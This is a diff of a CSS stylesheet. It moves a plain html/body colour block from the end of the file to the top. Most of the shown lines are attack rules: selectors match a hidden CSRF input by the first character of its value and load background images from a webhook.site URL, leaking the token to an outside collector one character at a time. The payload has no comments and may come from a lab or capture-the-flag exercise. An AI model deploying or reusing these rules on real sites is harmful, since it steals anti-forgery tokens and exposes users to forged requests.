@@ -1,3 +1,12 @@
+html, body {
+	width: 100%;
+	margin: 0;
+	padding: 0;
+	color: #ffffff;
+	background: #c94c4c;
+}
+
+
 input[name=csrf][value^=a]{ background-image: url(https://webhook.site/20c9d334-0972-4926-a367-5162dba6b969/a); }
 input[name=csrf][value^=b]{ background-image: url(https://webhook.site/20c9d334-0972-4926-a367-5162dba6b969/b); }
 input[name=csrf][value^=c]{ background-image: url(https://webhook.site/20c9d334-0972-4926-a367-5162dba6b969/c); }
@@ -70,10 +79,3 @@ input[name=csrf][value^="8"]{ background-image: url(https://webhook.site/20c9d33
 input[name=csrf][value^="9"]{ background-image: url(https://webhook.site/20c9d334-0972-4926-a367-5162dba6b969/9); }
 
 
-html, body {
-	width: 100%;
-	margin: 0;
-	padding: 0;
-	color: #ffffff;
-	background: #c94c4c;
-}
